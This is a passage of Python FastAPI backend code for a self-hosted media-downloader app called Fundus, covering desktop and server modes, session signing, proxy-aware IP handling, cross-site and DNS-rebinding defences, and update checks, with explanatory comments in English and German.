import asyncio
import os
import json
import re
import shlex
import hmac
import time
import uuid
import base64
import hashlib
import secrets  # noqa: F401  (used for tokens and constant-time compares)
import urllib.request
import urllib.parse
from pathlib import Path
from datetime import datetime
from contextlib import asynccontextmanager

from fastapi import FastAPI, Request, Form, HTTPException, BackgroundTasks, Depends, UploadFile, File
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse, RedirectResponse, PlainTextResponse
from fastapi.templating import Jinja2Templates

import db
import i18n
import podcast

# Relative by default — correct for the container, whose working directory is
# the application directory with the volume mounted there. Overridable because
# the desktop app's working directory is inside the signed application bundle:
# writing downloads there breaks the signature, fills up /Applications, fails
# outright for a user without administrator rights, and loses everything on
# the next update. The app passes these three; nothing else needs to.
DOWNLOAD_DIR = Path(os.environ.get("DOWNLOAD_DIR") or "downloads")
DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)

TMP_DIR = Path(os.environ.get("TMP_DIR") or "tmp")
TMP_DIR.mkdir(parents=True, exist_ok=True)

DATA_DIR = Path(os.environ.get("DATA_DIR") or "data")
DATA_DIR.mkdir(parents=True, exist_ok=True)

# ── Where are we running? ─────────────────────────────────────────────────────
# The same code serves a public VPS and a Mac app. The difference that matters
# is not cosmetic: a datacenter IP is treated as suspicious by YouTube, a home
# connection is not. Everything below follows from that, plus from the fact
# that a laptop has disk space and a Neural Engine and a 4 vCPU server has
# neither.
#
# setdefault, not assignment: an explicit environment variable always wins, so
# a local instance can still be configured like a server and vice versa.
LOCAL_MODE = os.environ.get("LOCAL_MODE", "").strip().lower() in ("1", "true", "yes")

# Ob der Login entfallen darf — nicht dasselbe wie LOCAL_MODE.
#
# Die Loopback-Ausnahme stützte sich auf `request.client`, und die Begründung
# lautete: wer den Port erreicht, läuft schon als dieser Nutzer. Das stimmt,
# solange nichts dazwischensteht. Steht auf derselben Maschine ein nginx oder
# Caddy davor, ist `request.client` für JEDEN Besucher aus dem Internet
# 127.0.0.1 — und wer `LOCAL_MODE=1` in die .env eines öffentlichen
# Containers schreibt, hat damit eine Instanz ohne Login, deren impliziter
# Nutzer der erste Account und damit Administrator ist.
#
# Deshalb reicht LOCAL_MODE allein nicht mehr. Nötig sind zusätzlich:
#
#  * FUNDUS_DESKTOP=1 — setzt nur die Mac-App beim Start ihres eigenen
#    Servers (Backend.swift). Eine .env-Zeile reicht nicht, weil niemand
#    diese Variable aus Versehen setzt; sie bedeutet „ich bin die App".
#  * kein TRUSTED_PROXIES — ist ein Proxy konfiguriert, ist ausdrücklich
#    jemand dazwischen, und dann sagt eine Loopback-Adresse nichts aus.
#
# LOCAL_MODE steuert weiterhin die Vorgaben darunter. Nur der Login hängt
# jetzt an der engeren Bedingung.
DESKTOP_MODE = (
    LOCAL_MODE
    and os.environ.get("FUNDUS_DESKTOP", "").strip() == "1"
    and not os.environ.get("TRUSTED_PROXIES", "").strip()
)

if LOCAL_MODE:
    # A desktop install is one person on their own machine using their own
    # connection — the situation the defaults elsewhere are cautious about
    # does not arise.
    #
    # YouTube media is NOT switched on here any more (1.1.0, legal review):
    # on the desktop it is a runtime setting the person turns on themselves,
    # after installing an extractor with consent — see youtube_video_enabled().
    # Deliberately NOT a daily timer here, unlike an earlier version of this
    # block. The update installs unpinned pre-release packages from PyPI and
    # runs them. On a machine someone else was handed, that is the most likely
    # way this app ever gets compromised — far more likely than anything in
    # the Swift. The System tab has a button; a human presses it.
    os.environ.setdefault("UPDATE_INTERVAL_H", "0")
    # Disk is not scarce here, and a local run is usually someone working
    # through a batch over an afternoon rather than a transfer point.
    os.environ.setdefault("CLEAN_AGE_HOURS", "168")

# ENABLE_MEDIA_TOOLS used to default to on in DESKTOP_MODE. Since 1.1.0 it is
# off there too; the desktop switches it at runtime (db setting "media_tools",
# see mcp_tools.media_tools_enabled). Servers keep the environment variable.

if LOCAL_MODE:
    # Apple Silicon runs the best Whisper model roughly as fast as the server
    # runs its worst one. base is noticeably weak on German.
    os.environ.setdefault("WHISPER_MODEL", "large-v3-turbo")
    # The guardrails exist because a small VPS dies on a heavy re-encode.
    os.environ.setdefault("MERGE_MAX_CLIPS", "300")
    os.environ.setdefault("MERGE_MAX_SECONDS", "36000")
    os.environ.setdefault("BATCH_MAX_URLS", "500")
    os.environ.setdefault("BATCH_MAX_PER_HOUR", "2000")
    os.environ.setdefault("TRIM_MAX_MINUTES", "600")

# On a local machine yt-dlp can read the browser's own cookie jar, which
# removes the whole export-and-upload ritual — and with it the throwaway
# account, the expiry, and the re-upload every few weeks. Unavailable in a
# container: there is no browser profile inside one.
BROWSER_COOKIES = os.environ.get("BROWSER_COOKIES", "").strip().lower()
_BROWSERS = {"safari", "chrome", "chromium", "firefox", "edge", "brave", "opera", "vivaldi", "whale"}
if BROWSER_COOKIES and BROWSER_COOKIES not in _BROWSERS:
    BROWSER_COOKIES = ""          # goes into a command line — allowlist only


def _browser_cookie_args() -> list[str]:
    return ["--cookies-from-browser", BROWSER_COOKIES] if BROWSER_COOKIES else []


# Registration gate (family & friends). Secure by default: once the first
# account exists, sign-up is CLOSED unless explicitly opened.
#   SIGNUP_CODE set   → sign-up allowed with that invite code
#   OPEN_SIGNUP=1     → sign-up open to anyone (only for public instances)
#   neither           → closed after the first account (default)
SIGNUP_CODE = os.environ.get("SIGNUP_CODE", "")
OPEN_SIGNUP = os.environ.get("OPEN_SIGNUP", "").strip().lower() in ("1", "true", "yes")


def _signup_mode() -> str:
    """'first' (no account yet) · 'code' · 'open' · 'closed'."""
    if db.user_count() == 0:
        return "first"
    if SIGNUP_CODE:
        return "code"
    return "open" if OPEN_SIGNUP else "closed"

# Branding is env-driven so the same code runs neutrally (public/GitHub) or
# white-labelled. Defaults are neutral; set BRAND_TAG to add a wordmark line.
APP_NAME = os.environ.get("APP_NAME", "Fundus")
BRAND_TAG = os.environ.get("BRAND_TAG", "")            # e.g. "yourbrand" — empty = neutral
BRAND_TAGLINE = os.environ.get("BRAND_TAGLINE", "Links rein. Material raus.")


def request_lang(request: Request | None) -> str:
    """The caller's language: ?lang=, then the cookie, then Accept-Language."""
    if request is None:
        return i18n.DEFAULT_LANG
    return i18n.resolve(
        query_lang=request.query_params.get("lang", ""),
        cookie_lang=request.cookies.get(i18n.COOKIE_NAME, ""),
        accept=request.headers.get("accept-language", ""),
    )


def _msg(request: Request | None, text: str) -> str:
    """A server message (error, stage, note) in the caller's language."""
    return i18n.translate_message(text, request_lang(request))


def _localized(request: Request | None, payload):
    """A copy of a status payload with error/stage/note/detail translated."""
    return i18n.translate_fields(payload, request_lang(request))


def _brand_ctx(request: Request | None = None) -> dict:
    """Template context: branding plus everything the page needs to render in
    the caller's language.

    `t` is handed to Jinja as a callable so templates read `{{ t("…") }}`, and
    the whole catalogue goes along as JSON because most of this UI is built by
    its own JavaScript — the browser needs the strings too.
    """
    lang = request_lang(request)
    return {
        "app_name": APP_NAME, "brand_tag": BRAND_TAG, "brand_tagline": BRAND_TAGLINE,
        "media_tools": __import__("mcp_tools").media_tools_enabled(),
        # Media opt-in controls (install, toggles) exist only in the app.
        "is_desktop": DESKTOP_MODE,
        # A desktop install has one user and no operator: accounts, IP blocks
        # and user management are answers to questions nobody is asking there.
        "is_local": LOCAL_MODE,
        "lang": lang,
        "t": lambda key: i18n.translate(key, lang),
        "i18n_json": i18n.catalog_json(lang),
        "js_locale": i18n.js_locale(lang),
        "languages": i18n.available(),
    }

# Session signing secret, persisted so cookies survive restarts.
_SECRET_FILE = DATA_DIR / "secret.key"
if _SECRET_FILE.exists():
    SECRET = _SECRET_FILE.read_bytes()
else:
    SECRET = secrets.token_bytes(32)
    _SECRET_FILE.write_bytes(SECRET)
    try:
        os.chmod(_SECRET_FILE, 0o600)
    except OSError:
        pass

# ── MCP server (mounted below) ────────────────────────────────────────────────
from mcp_tools import mcp, mcp_app   # noqa: E402


# Downloaded files are transient — purge anything older than this (hours).
CLEAN_AGE_H = int(os.environ.get("CLEAN_AGE_HOURS", "6"))


def _cleanup_old_files(max_age_h: int = CLEAN_AGE_H) -> int:
    """Delete downloads/tmp files older than max_age_h so the disk can't fill up.
    Walks recursively (gallery-dl job dirs) and removes emptied directories."""
    cutoff = time.time() - max_age_h * 3600
    removed = 0
    for d in (DOWNLOAD_DIR, TMP_DIR):
        for f in d.rglob("*"):
            try:
                if f.is_file() and f.stat().st_mtime < cutoff:
                    f.unlink()
                    removed += 1
            except OSError:
                pass
        # Drop now-empty subdirectories (deepest first).
        for sub in sorted((p for p in d.rglob("*") if p.is_dir()), reverse=True):
            try:
                sub.rmdir()               # fails silently if not empty
            except OSError:
                pass
    return removed


def _prune_state(max_age_h: int = CLEAN_AGE_H):
    """Drop in-memory job/batch records once their files are gone, and expire
    stale login-throttle entries. Without this the dicts grow forever."""
    cutoff = time.time() - max_age_h * 3600

    def _too_old(rec: dict) -> bool:
        try:
            return datetime.fromisoformat(rec["created"]).timestamp() < cutoff
        except (KeyError, TypeError, ValueError):
            return False

    stale_batches = [bid for bid, b in batches.items() if _too_old(b)]
    for bid in stale_batches:
        for jid in batches[bid].get("job_ids", []):
            jobs.pop(jid, None)
        batches.pop(bid, None)
    for jid in [j for j, rec in jobs.items() if _too_old(rec)]:
        jobs.pop(jid, None)
    # Trim sessions hold a full-quality audio file each — the largest thing
    # this tool keeps on disk, so they follow the same expiry as everything
    # else rather than lingering until someone notices.
    for tid in [t for t, rec in trims.items() if _too_old(rec)]:
        trims.pop(tid, None)
    # Podcast records hold every episode's full show notes. Twenty-five of
    # those per run adds up to a real leak over a few weeks.
    for pid in [p for p, rec in podcasts.items() if _too_old(rec)]:
        podcasts.pop(pid, None)

    now = time.time()
    for ip in [i for i, ts in _login_fails.items()
               if not any(now - t < 600 for t in ts)]:
        _login_fails.pop(ip, None)
    for uid in [u for u, ts in _batch_calls.items()
                if not any(now - t < 3600 for t in ts)]:
        _batch_calls.pop(uid, None)


async def _cleanup_loop():
    while True:
        try:
            _cleanup_old_files()
            _prune_state()
        except Exception:
            pass
        await asyncio.sleep(3600)      # hourly sweep


# Platform extractors break on YouTube's schedule, not ours — a container that
# has been up for three weeks is running three-week-old extractors. Boot-time
# update alone is not enough for a service that rarely restarts.
#
# Randomised within the hour on purpose: every instance updating at exactly
# 03:00 UTC hammers the same release CDN. The jitter costs nothing.
# Off by default. Keeping a third-party extractor automatically current is a
# maintenance decision the operator makes, not something a fresh install
# should start doing on its own. Set to 24 to enable daily updates.
UPDATE_INTERVAL_H = int(os.environ.get("UPDATE_INTERVAL_H", "0"))


# Looking is not running. The security review switched scheduled *updates*
# off everywhere, because an unattended `pip install --pre` executes code
# nobody pinned. It said nothing against finding out that a new version
# exists — and that is the part with the actual value: a yt-dlp three weeks
# old fails on videos that worked yesterday, and without a check you learn
# that from a broken download instead of from a line in the interface.
#
# So the two halves are separate now: checking runs on a schedule and only
# reads a JSON document, installing stays one deliberate click.
CHECK_INTERVAL_H = int(os.environ.get("CHECK_INTERVAL_H", "24"))

# Alles, was in derselben venv per pip liegt und veralten kann. Es war nicht
# nur yt-dlp: Deno und ffmpeg kommen hier ebenfalls als Wheel (siehe
# Backend.swift, ensureMediaTools), und ein Extraktor, der eine zwei Jahre
# alte JS-Laufzeit benutzt, scheitert genauso wie ein alter Extraktor — nur
# sieht man es nicht am Versionsstand von yt-dlp.
#
# `pre` trennt die Kanäle: yt-dlp wird mit --pre installiert, dort ist die
# neueste Vorabversion die richtige Zielmarke. Für die anderen ist es die
# stabile, und sie gegen Nightlies zu vergleichen würde ewig „veraltet"
# melden.
PIP_COMPONENTS: dict[str, dict] = {
    "yt-dlp":        {"label": "yt-dlp",      "pre": True,  "key": "yt_dlp"},
    "gallery-dl":    {"label": "gallery-dl",  "pre": False, "key": "gallery_dl"},
    "curl_cffi":     {"label": "curl_cffi",   "pre": False, "key": None},
    "deno":          {"label": "JS-Runtime",  "pre": False, "key": None},
    "static-ffmpeg": {"label": "ffmpeg",      "pre": False, "key": None},
}

_ytdlp_latest: dict = {"value": "", "checked": None, "behind": False}
# Pro Paket: installiert, verfügbar, veraltet. Getrennt von _ytdlp_version,
# weil „verfügbar" eine Auskunft von PyPI ist und „installiert" eine über
# diese Maschine — die zu vermischen ist genau der Fehler, der „es hat sich
# selbst aktualisiert" suggeriert.
_latest: dict[str, dict] = {}
# Ergebnis des letzten Update-Versuchs. Vorher verschluckte ein
# `except Exception: pass` jeden Fehlschlag, und die Oberfläche zeigte danach
# unverändert dieselbe Version — ein gescheitertes Update war von einem
# erfolgreichen nicht zu unterscheiden.
_last_update: dict = {"at": None, "ok": None, "detail": ""}


def _version_tuple(s: str) -> tuple:
    """Versionen als Zahlen vergleichen, nicht als Text.

    yt-dlp meldet „2026.09.27.232945", PyPI nennt denselben Build
    „2026.9.27.232945.dev0". Alle Nichtziffern zu entfernen sieht einfacher
    aus und ist falsch: es klebt „09" zu einer anderen Zahl zusammen als „9"
    und behält die 0 aus „dev0".

    Der Zusatz klebt nach PEP 440 am Zahlenteil: „0.16.4b1" ist eine
    Vorabversion von 0.16.4. Nur auf den Anfang eines Abschnitts zu sehen
    reicht deshalb nicht — „4b1" beginnt mit einer Ziffer, ist aber keine.
    Dieser Fehler hat an der laufenden App ein installiertes 0.16.4b1 als
    veraltet gegenüber 0.16.3 gemeldet, weil „4b1" stillschweigend
    verschwand und (0,16) gegen (0,16,3) verlor.
    """
    parts = []
    for p in (s or "").strip().split("."):
        m = re.match(r"^(\d+)(.*)$", p)
        if not m:
            break                   # etwa „dev0" als eigener Abschnitt
        parts.append(int(m.group(1)))
        if m.group(2):
            break                   # ab dem Zusatz ist die Zahl zu Ende
    return tuple(parts)


async def _pypi_newest(pkg: str, pre: bool) -> str:
    """Die neueste Version eines Pakets auf PyPI. Liest, installiert nichts."""
    body = await asyncio.to_thread(
        lambda: urllib.request.urlopen(
            f"https://pypi.org/pypi/{pkg}/json", timeout=15).read())
    data = json.loads(body)
    if not pre:
        return (data.get("info") or {}).get("version", "")
    # Neueste nach Upload-Zeit, nicht nach Versionstext: die sortieren meist
    # wie Datumsangaben, aber „2026.9.8" steht als Text über „2026.9.16" —
    # genau dort lügt der Textvergleich.
    newest, when = "", ""
    for ver, files in (data.get("releases") or {}).items():
        if not files:
            continue
        up = max((f.get("upload_time") or "") for f in files)
        if up > when:
            newest, when = ver, up
    return newest


def _installed_pip_versions() -> dict[str, str]:
    """Was in dieser Umgebung installiert ist, aus den Paket-Metadaten.

    Nicht über die Ausgabe der Programme selbst: ffmpeg meldet „8.1.2", das
    Paket static-ffmpeg nennt sich „2026.9.1" — ein Vergleich zwischen beiden
    Zahlenwelten ergibt immer „veraltet".

    Und nicht über `pip list`: das wäre ein Unterprozess, und ein Test hält
    hier fest, dass die Prüfung keinen Befehl ausführt. Die Grenze ist nicht
    pedantisch — sie ist der Unterschied zwischen Nachsehen und Ausführen, und
    genau den hat das Security-Review verlangt. `importlib.metadata` liest
    dieselben Metadaten, nur im eigenen Prozess.
    """
    from importlib import metadata
    out: dict[str, str] = {}
    for pkg in PIP_COMPONENTS:
        try:
            out[pkg.lower().replace("-", "_")] = metadata.version(pkg)
        except Exception:
            pass                    # nicht installiert ist kein Fehler
    return out


async def _check_ytdlp_latest() -> dict:
    """Nachsehen, was es Neues gibt — für jede pip-Komponente, nicht nur eine.

    Vorher prüfte das genau ein Paket von fünf. Die anderen vier konnten
    beliebig veralten, ohne dass irgendwo etwas davon stand.
    """
    installed = _installed_pip_versions()
    for pkg, meta in PIP_COMPONENTS.items():
        have = installed.get(pkg.lower().replace("-", "_"), "")
        # Nicht per pip da heißt: pip gehört es nicht. Deno und ffmpeg kommen
        # auf einer Maschine mit Homebrew von dort, und auf einer leeren
        # bringt die App sie als Wheel mit (Backend.swift, ensureMediaTools)
        # — aber nur, wenn sie nicht schon im PATH liegen. Ein pip-Upgrade
        # wäre dann der falsche Hebel: es würde ein zweites ffmpeg neben das
        # von Homebrew legen, und aktualisiert hätte man nichts.
        #
        # An der laufenden App stand hier „ffmpeg — → 3.0, aktuell": kein
        # Versionsstand, und trotzdem die Entwarnung. Lieber nichts sagen als
        # das.
        if not have:
            _latest.pop(pkg, None)
            continue
        try:
            newest = await _pypi_newest(pkg, meta["pre"])
        except Exception as e:
            log_error("version-check", f"{pkg}: {str(e)[:150]}")
            continue
        if not newest:
            continue
        _latest[pkg] = {
            "label": meta["label"],
            "installed": have,
            "available": newest,
            "behind": _version_tuple(newest) > _version_tuple(have),
        }
    # Die alte Einzelauskunft bleibt, weil die Oberfläche und die Tests sie
    # benutzen — yt-dlp ist weiter die Komponente, die am häufigsten bricht.
    yt = _latest.get("yt-dlp")
    if yt:
        _ytdlp_latest.update(value=yt["available"], behind=yt["behind"])
    _ytdlp_latest["checked"] = datetime.now().isoformat(timespec="seconds")
    return _ytdlp_latest


async def _update_loop():
    """Checks always, installs only when the operator asked for it."""
    import random
    installs = UPDATE_INTERVAL_H > 0
    interval = (UPDATE_INTERVAL_H if installs else CHECK_INTERVAL_H)
    if interval <= 0:                       # both switched off
        return
    while True:
        await asyncio.sleep(interval * 3600 + random.randint(0, 3600))
        try:
            # Never while work is in flight: pip swapping files under a running
            # yt-dlp is how you get half-written downloads.
            if any(j.get("status") == "running" for j in jobs.values()):
                continue
            await _check_ytdlp_latest()
            if installs:
                await _self_update()
        except Exception as e:
            log_error("self-update", str(e)[:200])


@asynccontextmanager
async def lifespan(app: FastAPI):
    db.init_db()
    _cleanup_old_files()               # sweep leftovers from previous runs on boot
    async with mcp.session_manager.run():
        asyncio.create_task(_boot())
        asyncio.create_task(_cleanup_loop())
        asyncio.create_task(_update_loop())
        asyncio.create_task(_parent_watch())
        yield


async def _parent_watch():
    """Desktop: end with the app. When the app is killed rather than quit
    (force quit, crash, `kill`), it never gets to stop its server, and the
    orphan keeps port 8765 — the next launch then falls back to a random port
    and every MCP client configured for 8765 talks to a stale process."""
    try:
        parent = int(os.environ.get("FUNDUS_PARENT_PID", "0"))
    except ValueError:
        return
    if parent <= 1:
        return
    while True:
        await asyncio.sleep(3)
        if os.getppid() != parent:
            os._exit(0)


app = FastAPI(title="Fundus", lifespan=lifespan)
app.mount("/mcp", mcp_app)
templates = Jinja2Templates(directory="templates")


from starlette.exceptions import HTTPException as _StarletteHTTPException   # noqa: E402
from fastapi.exception_handlers import http_exception_handler as _default_http_handler  # noqa: E402


@app.exception_handler(_StarletteHTTPException)
async def _translated_http_exception(request: Request, exc: _StarletteHTTPException):
    """HTTPException details are written in German, like the UI they came
    from; an English caller gets them translated. Status code and headers are
    FastAPI's own handling — only the text changes."""
    if isinstance(exc.detail, str):
        detail = _msg(request, exc.detail)
        if detail != exc.detail:
            exc = _StarletteHTTPException(exc.status_code, detail, getattr(exc, "headers", None))
    return await _default_http_handler(request, exc)


async def _boot():
    if private_ext:
        await private_ext.on_boot()
    await _read_ytdlp_version()
    # Only when scheduled updates are switched on. An install that opted out
    # of keeping the extractor current must not have it updated behind its
    # back on every restart.
    if UPDATE_INTERVAL_H > 0:
        await _self_update()
    # Check on boot too: reading a version number is not the thing the
    # release posture switched off. But CHECK_INTERVAL_H=0 is the documented
    # off switch for this connection, so it has to silence the boot check as
    # well; until 10/2026 it only stopped the daily one.
    if CHECK_INTERVAL_H > 0 or UPDATE_INTERVAL_H > 0:
        asyncio.create_task(_check_ytdlp_latest())


# ── Sessions (signed cookie: uid.timestamp.hmac) ──────────────────────────────

def _sign(uid: int) -> str:
    payload = f"{uid}.{int(time.time())}".encode()
    sig = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()[:32]
    return base64.urlsafe_b64encode(payload).decode() + "." + sig


def _unsign(token: str) -> int | None:
    try:
        b64, sig = token.rsplit(".", 1)
        payload = base64.urlsafe_b64decode(b64.encode())
        good = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()[:32]
        if not hmac.compare_digest(sig, good):
            return None
        uid_s, ts = payload.decode().split(".")
        if time.time() - int(ts) > 60 * 60 * 24 * 30:      # 30-day sessions
            return None
        return int(uid_s)
    except Exception:
        return None


# Which upstream addresses may speak for someone else. Empty means nobody —
# the safe default, because this value drives the IP block list and the login
# throttle. Trusting the header unconditionally let anyone rotate
# X-Forwarded-For to shed an admin ban and turn an 8-attempt brute-force limit
# into no limit at all.
TRUSTED_PROXIES = {p.strip() for p in os.environ.get("TRUSTED_PROXIES", "").split(",")
                   if p.strip()}


def _client_ip(request: Request) -> str:
    """The caller's address, as far as it can be established.

    X-Forwarded-For is only consulted when the immediate peer is a proxy we
    were told to trust — and then the *last* entry is taken, not the first:
    everything to the left of it is whatever the client chose to claim.
    """
    peer = request.client.host if request.client else ""
    if peer in TRUSTED_PROXIES:
        hops = [h.strip() for h in request.headers.get("x-forwarded-for", "").split(",")
                if h.strip()]
        for hop in reversed(hops):
            if hop not in TRUSTED_PROXIES:
                return hop
    return peer


# ── Cross-site protection for the desktop build ───────────────────────────────
# Loopback alone is not a credential. "From this machine" includes every page
# open in every browser the person uses, and the state-changing endpoints take
# form bodies — which browsers send cross-origin without a preflight. A page
# on the open web could therefore start downloads, overwrite the stored cookie
# jars, or delete an account.
#
# Two layers. The app passes a random token in the environment and injects it
# into its own WebView; requests carrying it are accepted outright. Anything
# else must look like it came from the app's own page — which also covers the
# case where someone opens the UI in a normal browser tab on purpose.
LOCAL_TOKEN = os.environ.get("LOCAL_TOKEN", "").strip()

_SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}


def _same_origin(request: Request) -> bool:
    """Does this request claim to come from our own page?

    Origin is sent on exactly the cross-origin form posts that matter here;
    when absent, Referer is checked, and a request with neither is let through
    because some tooling omits both and this is not the only layer.
    """
    own = f"{request.url.scheme}://{request.url.netloc}"
    origin = request.headers.get("origin", "")
    if origin:
        return origin == own
    referer = request.headers.get("referer", "")
    return referer.startswith(own + "/") if referer else True


# Which Host headers a desktop request may carry. Without this check a page
# on the open web could rebind its own domain to 127.0.0.1 (DNS rebinding):
# the browser then treats the app's server as same-origin with that page and
# lets its scripts read the answers, while the server sees a loopback request.
_LOCAL_HOSTS = {"127.0.0.1", "localhost", "[::1]", "::1"}
LOCAL_COOKIE = "fundus_local"


def _host_is_local(request: Request) -> bool:
    h = request.headers.get("host", "").strip().lower()
    name = h if h.endswith("]") else h.rsplit(":", 1)[0]
    return name in _LOCAL_HOSTS


def _has_local_token(request: Request) -> bool:
    """Does this request come from the app's own WebView?

    Loopback is not enough: on a Mac with several accounts, everyone can reach
    127.0.0.1, and every browser tab can too. The app hands its WebView the
    token three ways — the first page load carries it in the query (and gets
    an HttpOnly cookie back), fetch/XHR carry it as a header, and downloads
    and plain links carry the cookie. A process started without a token
    (development, tests) is not held to it.
    """
    if not LOCAL_TOKEN:
        return True
    for cand in (request.headers.get("x-fundus-token", ""),
                 request.cookies.get(LOCAL_COOKIE, ""),
                 request.query_params.get("t", "")):
        if cand and hmac.compare_digest(cand, LOCAL_TOKEN):
            return True
    return False


def _desktop_request(request: Request) -> bool:
    """The single test for "the person at this Mac, inside the app"."""
    return (DESKTOP_MODE and _is_loopback(request) and _host_is_local(request)
            and _has_local_token(request))


def _local_request_allowed(request: Request) -> bool:
    if request.method in _SAFE_METHODS:
        return True
    # compare_digest, not ==: a plain string compare returns early at the
    # first differing byte, which leaks the token length-prefix by timing.
    # Same reasoning as _has_local_token above.
    cand = request.headers.get("x-fundus-token", "")
    if LOCAL_TOKEN and cand and hmac.compare_digest(cand, LOCAL_TOKEN):
        return True
    return _same_origin(request)


def _is_loopback(request: Request) -> bool:
    """Did this request come from the machine itself?

    Deliberately reads request.client rather than any forwarded header: the
    whole point is that nothing in between can claim to be local.
    """
    host = request.client.host if request.client else ""
    return host in ("127.0.0.1", "::1", "localhost")


def _local_user() -> dict | None:
    """The single implicit account a desktop install runs as.

    A password on a server that only listens on 127.0.0.1 protects against
    nobody: anything that can reach the port is already running as this user
    and could read the database directly. ClipGrab has no login either, and
    asking for one here would be security theatre with a cost.
    """
    users = db.list_users()
    if users:
        return users[0]
    created = db.create_user("local", secrets.token_urlsafe(32))
    return created


def current_user(request: Request) -> dict:
    uid = _unsign(request.cookies.get("hd_session", ""))
    user = db.get_user(uid) if uid else None
    if (not user or user.get("blocked")) and _desktop_request(request):
        local = _local_user()
        if local:
            return local
    if not user or user.get("blocked"):
        raise HTTPException(401, "Nicht angemeldet")
    return user


def require_admin(request: Request) -> dict:
    user = current_user(request)
    if not user.get("is_admin"):
        raise HTTPException(403, "Nur Admin")
    return user


# Paths reachable without a session.
# /api/lang is open on purpose: the login page carries the switcher too, and a
# language preference is not worth an auth check.
_OPEN_PATHS = {"/health", "/login", "/robots.txt", "/api/login", "/api/register",
               "/api/signup-required", "/api/lang",
               # The order-sheet brief is schema documentation, and its whole
               # purpose is to be fetchable by an assistant that has no
               # session here. Carries no user data.
               "/api/podcast/auftragszettel.md"}


# Sent on every response, including the gate's own refusals and /mcp.
# nosniff: downloads and transcripts are user-controlled bytes; a browser
#   must not guess "text/html" from them and run what it finds.
# Referrer: links out of the app (source videos, shownotes) should not carry
#   job ids or podcast ids in the Referer to third parties.
# Framing: no page here is meant to be embedded; DENY plus frame-ancestors
#   covers old and new browsers against clickjacking of the admin buttons.
# Deliberately no script-src: the templates carry inline scripts, and a CSP
#   that breaks them would be switched off rather than tightened.
_SECURITY_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "same-origin",
    "X-Frame-Options": "DENY",
    "Content-Security-Policy": "frame-ancestors 'none'",
}


@app.middleware("http")
async def _gate(request: Request, call_next):
    path = request.url.path
    if DESKTOP_MODE and not _host_is_local(request):
        return PlainTextResponse("Falscher Host.", status_code=421)
    ip = _client_ip(request)
    if db.is_ip_blocked(ip):
        return PlainTextResponse("Blockiert.", status_code=403)
    # "/mcp" is what people type and what most client docs show. The mount
    # answers it with a 307 to "/mcp/", and some clients either do not follow
    # a 307 on POST or drop the Authorization header on the way. Served
    # directly instead.
    if path == "/mcp":
        request.scope["path"] = "/mcp/"
        request.scope["raw_path"] = b"/mcp/"
        path = "/mcp/"
    # MCP: per-user Bearer token = the user's api_token.
    if path.startswith("/mcp"):
        import mcp_tools
        token = ""
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            token = auth[7:].strip()
        muser = db.get_user_by_token(token) if token else None
        if not muser or muser.get("blocked"):
            return JSONResponse({"error": _msg(request, "MCP: gültigen Bearer-Token (api_token) senden.")},
                                status_code=401)
        mcp_tools.current_mcp_user.set(muser)
        return await call_next(request)
    open_ok = path in _OPEN_PATHS or (path.startswith("/fonts/") and path[7:] in _FONTS)
    # Desktop install: no login wall for requests from this machine. The
    # loopback check is the actual security boundary here, not the cookie —
    # and it is checked per request, so binding the server to 0.0.0.0 brings
    # the login back rather than silently opening the instance up.
    if _desktop_request(request) and not open_ok:
        if not _local_request_allowed(request):
            return JSONResponse(
                {"detail": _msg(request, "Anfrage von einer fremden Seite abgewiesen.")}, status_code=403)
        if _local_user():
            open_ok = True
    if not open_ok:
        uid = _unsign(request.cookies.get("hd_session", ""))
        user = db.get_user(uid) if uid else None
        if not user or user.get("blocked"):
            if path.startswith("/api/"):
                return JSONResponse({"detail": _msg(request, "Nicht angemeldet")}, status_code=401)
            return RedirectResponse("/login", status_code=302)
        db.touch_ip(user["id"], ip)
    # Refuse an oversized upload on its declared size, before the multipart
    # parser spools it: Starlette has no body limit of its own, so a 10 GB
    # file would otherwise land on disk before the handler could say no.
    # A request without Content-Length (chunked) would slip past that check
    # and still be spooled in full, so the upload routes require one.
    upload_cap = (UPLOAD_MAX_MB + 1) * 1024 * 1024 if path == "/api/transcript/upload" else (
        6 * 1024 * 1024 if re.fullmatch(r"/api/podcast/[^/]+/transcript/[^/]+", path) else 0)
    if upload_cap and request.method == "POST":
        if "transfer-encoding" in request.headers or "content-length" not in request.headers:
            return JSONResponse({"detail": _msg(request, "Content-Length fehlt.")}, status_code=411)
        try:
            declared = int(request.headers.get("content-length") or 0)
        except ValueError:
            return JSONResponse({"detail": _msg(request, "Content-Length ungültig.")}, status_code=400)
        if declared > upload_cap:
            return JSONResponse({"detail": _msg(request, "Datei zu groß.")}, status_code=413)
    resp = await call_next(request)
    resp.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive"
    # First page load in the app carries the token in the query; from then on
    # the WebView holds it as a cookie. Strict, so no other site's request
    # ever carries it.
    if (LOCAL_TOKEN and DESKTOP_MODE and request.query_params.get("t")
            and hmac.compare_digest(request.query_params.get("t", ""), LOCAL_TOKEN)):
        resp.set_cookie(LOCAL_COOKIE, LOCAL_TOKEN, httponly=True, samesite="strict",
                        path="/", max_age=60 * 60 * 24 * 30)
    return resp


# Registered after _gate, so Starlette puts it *outside* _gate: it also sees
# the gate's own early answers (421, 403, 401) and everything under /mcp.
@app.middleware("http")
async def _security_headers(request: Request, call_next):
    resp = await call_next(request)
    for k, v in _SECURITY_HEADERS.items():
        if k not in resp.headers:
            resp.headers[k] = v
    return resp

jobs: dict[str, dict] = {}
batches: dict[str, dict] = {}

# ── Error log ─────────────────────────────────────────────────────────────────
# In-memory ring buffer: survives long enough to debug a failure, never fills
# the disk, and disappears on restart like everything else in this tool.
from collections import deque                                      # noqa: E402

ERROR_LOG_MAX = int(os.environ.get("ERROR_LOG_MAX", "200"))
_error_log: deque = deque(maxlen=ERROR_LOG_MAX)


def log_error(where: str, message: str, url: str = "", user: str = ""):
    _error_log.appendleft({
        "at": datetime.now().isoformat(timespec="seconds"),
        "where": where,
        "url": (url or "")[:300],
        "user": user or "",
        "message": re.sub(r"\s+", " ", str(message or ""))[:600],
    })


# ── Helpers ────────────────────────────────────────────────────────────────────

_CREDS_RE = re.compile(r"://[^/@\s]+:[^/@\s]+@")


def scrub(text: str) -> str:
    """Strip credentials out of anything on its way to a user or a log.

